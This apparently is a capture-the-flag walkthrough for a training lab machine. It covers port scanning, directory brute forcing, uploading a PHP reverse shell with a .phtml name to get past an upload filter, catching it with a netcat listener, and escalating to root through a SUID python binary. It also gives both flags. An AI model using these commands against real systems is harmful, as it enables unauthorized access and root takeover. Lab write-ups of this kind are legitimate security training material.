### Scan the machine, how many ports are open?
```BASH
nmap -sV -p- 10.10.181.86
```
![image](https://github.com/user-attachments/assets/f2ec4d43-4cd6-441b-86b2-0cc4f762f78d)

<pre>2</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What version of Apache is running?
<pre>2.4.29</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What service is running on port 22?
<pre>ssh</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the hidden directory?
```BASH
gobuster dir -u "http://10.10.181.86/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```
![image](https://github.com/user-attachments/assets/f95da17f-b7b8-4ef8-a102-8922558fa8ea)

<pre>/panel/</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Find a form to upload and get a reverse shell, and find the flag.
Download reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
Change default ip address and port to your ip address and port `4444`

![image](https://github.com/user-attachments/assets/ac128c0d-4ce4-4ee1-90bf-309049d10339)  

Save as shell.phtml, because there is extension filter in input. Start a listener.
```BASH
nc -lvnp 4444
```

<span style="line-height:0.5;">&nbsp;</span>

Go to `http://10.10.181.86/uploads/shell.phtml?cmd=id` to run script.  

![image](https://github.com/user-attachments/assets/ebd1503a-c6a9-447f-9173-4a1f24ab03cc)

<span style="line-height:0.5;">&nbsp;</span>

Once the shell is triggered, upgrade the session.
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<span style="line-height:0.5;">&nbsp;</span>

Run find command to search for user.txt flag.
```BASH
find / -name user.txt 2>/dev/null
```
![image](https://github.com/user-attachments/assets/d91a1700-6b91-4864-ae00-075bebb53648)

<pre>THM{y0u_g0t_a_sh3ll}</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Search for files with SUID permission, which file is weird?
Run the SUID file search.
```BASH
find / -perm -4000 -type f 2>/dev/null
```
![image](https://github.com/user-attachments/assets/162ac3c0-9fa4-4aff-8da9-413b02e1b9ab)

The weird SUID file is: 
<pre>/usr/bin/python</pre>

### root.txt
To escalate privillages run:
```BASH
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
![image](https://github.com/user-attachments/assets/f583a3f6-99d0-474e-bae5-35cef85b45d8)

Run find command to search for root.txt flag.
```BASH
find / -name root.txt 2>/dev/null  
```
![image](https://github.com/user-attachments/assets/3bb6a472-e25f-43cc-8848-ac1a7a61ec48)

<pre>THM{pr1v1l3g3_3sc4l4t10n}</pre>


